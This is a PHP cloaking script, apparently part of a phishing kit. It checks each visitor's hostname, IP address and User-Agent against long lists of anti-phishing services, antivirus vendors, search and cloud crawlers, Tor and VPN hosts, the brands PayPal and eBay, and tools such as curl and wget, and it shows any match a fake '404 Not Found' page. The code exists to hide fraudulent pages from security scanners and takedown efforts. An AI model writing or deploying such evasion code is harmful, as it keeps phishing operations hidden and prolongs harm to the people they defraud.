<?php

$hostname      = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = array(
    'above',
    'google',
    'softlayer',
    'amazonaws',
    'cyveillance',
    'phishtank',
    'phishmonk',
    'dreamhost',
    'netpilot',
    'calyxinstitute',
    'tor-exit',
    'msnbot',
    'p3pwgdsn',
    'netcraft',
    'trendmicro',
    'ebay',
    'paypal',
    'torservers',
    'comodo',
    'crawl',
    'sucuri.net',
    'crawler',
    'proxy',
    'enom',
    'cloudflare',
    'yahoo',
    'trustwave',
    'rima-tde.net',
    'tfbnw.net',
    'pacbell.net',
    'tpnet.pl',
    'ovh.net',
    'centralnic',
    'badware',
    'phishing',
    'antivirus',
    'SiteAdvisor',
    'McAfee',
    'Bitdefender',
    'avirasoft',
    'avira',
    'avg',
    'metacafe',
    'norton',
    'avast',
'clients.your-server.de',
'^.static.zoot.jp',
'a2b-internet.com',
'retail.telecomitalia.it',
'corbina.ru',
't-ipconnect.de',
'markmonitor-gw.customer.alter.net',
'pl1477.nas81j-3.p-aichi.nttpc.ne.jp',
'^.ess.barracuda.com',
    'googleusercontent'
);
foreach ($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
        header('HTTP/1.0 404 Not Found');
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
        
    }
}
$bannedIP = array(
    '^104.236.153.*',
    '^107.170.*.*',
    '^109.186.*.*',
    '^12.148.196.*',
    '^12.148.209.*',
    '^128.242.*.*',
    '^131.212.*.*',
    '^149.20.*.*',
    '^158.108.*.*',
    '^163.195.178.*',
    '^167.24.*.*',
    '^168.188.*.*',
    '^173.194.*.*',
    '^173.224.160.*',
    '^173.224.161.*',
    '^173.224.162.*',
    '^173.224.163.*',
    '^173.224.164.*',
    '^173.224.165.*',
    '^173.224.166.*',
    '^173.224.167.*',
    '^184.173.*.*',
    '^192.115.134.*',
    '^192.118.48.*',
    '^193.220.178.*',
    '^193.253.199.*',
    '^193.47.80.*',
    '^194.52.68.*',
    '^194.72.238.*',
    '^194.90.*.*',
    '^198.25.*.*',
    '^198.54.*.*',
    '^199.30.228.*',
    '^202.108.252.*',
    '^204.14.48.*',
    '^206.28.72.*',
    '^207.126.144.*',
    '^208.65.144.*',
    '^208.91.115.*',
    '^209.73.228.*',
    '^209.85.*.*',
    '^209.85.128.*',
    '^212.143.*.*',
    '^212.150.*.*',
    '^212.235.*.*',
    '^212.29.192.*',
    '^212.29.224.*',
    '^212.50.193.*',
    '^216.10.193.*',
    '^216.239.32.*',
    '^216.252.167.*',
    '^217.132.*.*',
    '^217.132.*.*',
    '^38.100.*.*',
    '^38.100.*.*',
    '^38.105.*.*',
    '^38.144.36.*',
    '^46.116.*.* ',
    '^50.7.*.*',
    '^50.97.*.*',
    '^54.176.*.*',
    '^62.116.207.*',
    '^62.90.*.*',
    '^64.106.213.*',
    '^64.124.14.*',
    '^64.18.*.*',
    '^64.233.160.*',
    '^64.27.2.*',
    '^64.37.103.*',
    '^64.62.136.*',
    '^64.62.175.*',
    '^66.102.*.*',
    '^66.102.*.*',
    '^66.135.200.*',
    '^66.150.14.*',
    '^66.205.64.*',
    '^66.207.120.*',
    '^66.221.*.*',
    '^66.249.*.*',
    '^67.15.*.*',
    '^67.209.128.*',
    '^68.65.53.71',
    '^69.61.12.*',
    '^69.65.*.*',
    '^72.14.192.*',
    '^72.14.192.*',
    '^74.125.*.*',
    '^74.125.*.*',
    '^74.125.*.*',
    '^81.161.59.*',
    '^82.166.*.*',
    '^85.250.*.*',
    '^85.64.*.*',
    '^89.138.*.*',
    '^89.138.*.*',
    '^91.103.66.*',
    '^93.172.*.*',
    '109.201.133.100',
    '213.221.200.148',
'178.62.113.173',
'104.131.157.171',
'194.150.168.95',
'97.74.237.196',
'64.74.215.162',
'208.184.112.74',
'85.25.103.119',
'93.115.95.206',
'72.52.75.27',
'199.68.196.125',
'65.19.167.132',
'91.138.20.41',
'37.48.74.44',
'185.100.85.101',
'69.90.30.238',
'^64.74.215.*',
'146.20.65.135',
'204.101.161.159',
'^73.219.221.*',
'^69.162.139.*',
'^207.102.138.*',
'^64.125.148.*',
'144.172.68.51',
'95.221.197.*',
'51.255.202.66',
'79.165.163.100',
'128.69.183.131',
'104.42.198.99',
'114.202.198.140',
'175.194.101.186',
'58.229.102.223',
'222.237.35.55',
'95.45.252.1',
'107.137.214.47',
'195.214.79.20',
'219.117.238.170',
'46.244.10.179',
'91.231.212.111',
'89.163.237.45',
'193.200.150.152',
'212.47.243.53',
'82.52.27.80',
'66.150.9.129',
'128.68.215.226',
'209.66.70.253',
'95.85.8.153',
'213.81.140.36',
'139.162.156.104',
    '^95.76.156.*'
);
if (in_array($_SERVER['REMOTE_ADDR'], $bannedIP)) {
    header('HTTP/1.0 404 Not Found');
    exit();
} else {
    foreach ($bannedIP as $ip) {
        if (preg_match('/' . $ip . '/', $_SERVER['REMOTE_ADDR'])) {
            header('HTTP/1.0 404 Not Found');
            die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
        }
    }
}
if (preg_match('/legs\.com|bitly/si', $_SERVER["HTTP_USER_AGENT"])) {
    header('HTTP/1.0 404 Not Found');
    die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}
if (preg_match('/67\.221\.235\.(.*?)|74\.3\.160\.(.*?)/', $_SERVER['REMOTE_ADDR'])) {
    header('HTTP/1.0 404 Not Found');
    die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}
$Bot = array(
    "abot",
    "dbot",
    "ebot",
    "hbot",
    "kbot",
    "lbot",
    "mbot",
    "nbot",
    "obot",
    "pbot",
    "rbot",
    "sbot",
    "tbot",
    "vbot",
    "ybot",
    "zbot",
    "bot.",
    "bot/",
    "_bot",
    ".bot",
    "/bot",
    "-bot",
    ":bot",
    "(bot",
    "crawl",
    "slurp",
    "spider",
    "seek",
    "accoona",
    "acoon",
    "adressendeutschland",
    "ah-ha.com",
    "ahoy",
    "altavista",
    "ananzi",
    "anthill",
    "appie",
    "arachnophilia",
    "arale",
    "araneo",
    "aranha",
    "architext",
    "aretha",
    "arks",
    "asterias",
    "atlocal",
    "atn",
    "atomz",
    "augurfind",
    "backrub",
    "bannana_bot",
    "baypup",
    "bdfetch",
    "big brother",
    "biglotron",
    "bjaaland",
    "blackwidow",
    "blaiz",
    "blog",
    "blo.",
    "bloodhound",
    "boitho",
    "booch",
    "bradley",
    "butterfly",
    "calif",
    "cassandra",
    "ccubee",
    "cfetch",
    "charlotte",
    "churl",
    "cienciaficcion",
    "cmc",
    "collective",
    "comagent",
    "combine",
    "computingsite",
    "csci",
    "curl",
    "cusco",
    "daumoa",
    "deepindex",
    "delorie",
    "depspid",
    "deweb",
    "die blinde kuh",
    "digger",
    "ditto",
    "dmoz",
    "docomo",
    "download express",
    "dtaagent",
    "dwcp",
    "ebiness",
    "ebingbong",
    "e-collector",
    "ejupiter",
    "emacs-w3 search engine",
    "esther",
    "evliya celebi",
    "ezresult",
    "falcon",
    "felix ide",
    "ferret",
    "fetchrover",
    "fido",
    "findlinks",
    "fireball",
    "fish search",
    "fouineur",
    "funnelweb",
    "gazz",
    "gcreep",
    "genieknows",
    "getterroboplus",
    "geturl",
    "glx",
    "goforit",
    "golem",
    "grabber",
    "grapnel",
    "gralon",
    "griffon",
    "gromit",
    "grub",
    "gulliver",
    "hamahakki",
    "harvest",
    "havindex",
    "helix",
    "heritrix",
    "hku www octopus",
    "homerweb",
    "htdig",
    "html index",
    "html_analyzer",
    "htmlgobble",
    "hubater",
    "hyper-decontextualizer",
    "ia_archiver",
    "ibm_planetwide",
    "ichiro",
    "iconsurf",
    "iltrovatore",
    "image.kapsi.net",
    "imagelock",
    "incywincy",
    "indexer",
    "infobee",
    "informant",
    "ingrid",
    "inktomisearch.com",
    "inspector web",
    "intelliagent",
    "internet shinchakubin",
    "ip3000",
    "iron33",
    "israeli-search",
    "ivia",
    "jack",
    "jakarta",
    "javabee",
    "jetbot",
    "jumpstation",
    "katipo",
    "kdd-explorer",
    "kilroy",
    "knowledge",
    "kototoi",
    "kretrieve",
    "labelgrabber",
    "lachesis",
    "larbin",
    "legs",
    "libwww",
    "linkalarm",
    "link validator",
    "linkscan",
    "lockon",
    "lwp",
    "lycos",
    "magpie",
    "mantraagent",
    "mapoftheinternet",
    "marvin/",
    "mattie",
    "mediafox",
    "mediapartners",
    "mercator",
    "merzscope",
    "microsoft url control",
    "minirank",
    "miva",
    "mj12",
    "mnogosearch",
    "moget",
    "monster",
    "moose",
    "motor",
    "multitext",
    "muncher",
    "muscatferret",
    "mwd.search",
    "myweb",
    "najdi",
    "nameprotect",
    "nationaldirectory",
    "nazilla",
    "ncsa beta",
    "nec-meshexplorer",
    "nederland.zoek",
    "netcarta webmap engine",
    "netmechanic",
    "netresearchserver",
    "netscoop",
    "newscan-online",
    "nhse",
    "nokia6682/",
    "nomad",
    "noyona",
    "nutch",
    "nzexplorer",
    "objectssearch",
    "occam",
    "omni",
    "open text",
    "openfind",
    "openintelligencedata",
    "orb search",
    "osis-project",
    "pack rat",
    "pageboy",
    "pagebull",
    "page_verifier",
    "panscient",
    "parasite",
    "partnersite",
    "patric",
    "pear.",
    "pegasus",
    "peregrinator",
    "pgp key agent",
    "phantom",
    "phpdig",
    "picosearch",
    "piltdownman",
    "pimptrain",
    "pinpoint",
    "pioneer",
    "piranha",
    "plumtreewebaccessor",
    "pogodak",
    "poirot",
    "pompos",
    "poppelsdorf",
    "poppi",
    "popular iconoclast",
    "psycheclone",
    "publisher",
    "python",
    "rambler",
    "raven search",
    "roach",
    "road runner",
    "roadhouse",
    "robbie",
    "robofox",
    "robozilla",
    "rules",
    "salty",
    "sbider",
    "scooter",
    "scoutjet",
    "scrubby",
    "search.",
    "searchprocess",
    "semanticdiscovery",
    "senrigan",
    "sg-scout",
    "shai'hulud",
    "shark",
    "shopwiki",
    "sidewinder",
    "sift",
    "silk",
    "simmany",
    "site searcher",
    "site valet",
    "sitetech-rover",
    "skymob.com",
    "sleek",
    "smartwit",
    "sna-",
    "snappy",
    "snooper",
    "sohu",
    "speedfind",
    "sphere",
    "sphider",
    "spinner",
    "spyder",
    "steeler/",
    "suke",
    "suntek",
    "supersnooper",
    "surfnomore",
    "sven",
    "sygol",
    "szukacz",
    "tach black widow",
    "tarantula",
    "templeton",
    "/teoma",
    "t-h-u-n-d-e-r-s-t-o-n-e",
    "theophrastus",
    "titan",
    "titin",
    "tkwww",
    "toutatis",
    "t-rex",
    "tutorgig",
    "twiceler",
    "twisted",
    "ucsd",
    "udmsearch",
    "url check",
    "updated",
    "vagabondo",
    "valkyrie",
    "verticrawl",
    "victoria",
    "vision-search",
    "volcano",
    "voyager/",
    "voyager-hc",
    "w3c_validator",
    "w3m2",
    "w3mir",
    "walker",
    "wallpaper",
    "wanderer",
    "wauuu",
    "wavefire",
    "web core",
    "web hopper",
    "web wombat",
    "webbandit",
    "webcatcher",
    "webcopy",
    "webfoot",
    "weblayers",
    "weblinker",
    "weblog monitor",
    "webmirror",
    "webmonkey",
    "webquest",
    "webreaper",
    "websitepulse",
    "websnarf",
    "webstolperer",
    "webvac",
    "webwalk",
    "webwatch",
    "webwombat",
    "webzinger",
    "wget",
    "whizbang",
    "whowhere",
    "wild ferret",
    "worldlight",
    "wwwc",
    "wwwster",
    "xenu",
    "xget",
    "xift",
    "xirq",
    "yandex",
    "yanga",
    "yeti",
    "yodao",
    "zao/",
    "zippp",
    "Apache",
    "kaputte.li",
"static-customer.41.20.138.91.yetnet.ch",
    "secureserver.net",
"lh28409.voxility.net",
"static-ip-85-25-103-119.inaddr.ip-pool.com",
"pie-vpc-006.pie-coop.net",
"nl12x.mullvad.net",
"http://Anonymouse.org/ (Unix)",
"SynHttpClient-Built/5878",
"Faraday",
"Scrapy",
"ltx71",
"Ruby",
"MSIE",
"compatible",
"cloudflare",
"X11",
"facebook",
"microsoft",
"googleweblight",
    "zyborg"
);
foreach ($Bot as $BotType) {
    if (stripos($_SERVER['HTTP_USER_AGENT'], $BotType) !== false) {
        header('HTTP/1.0 404 Not Found');
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
    }
}
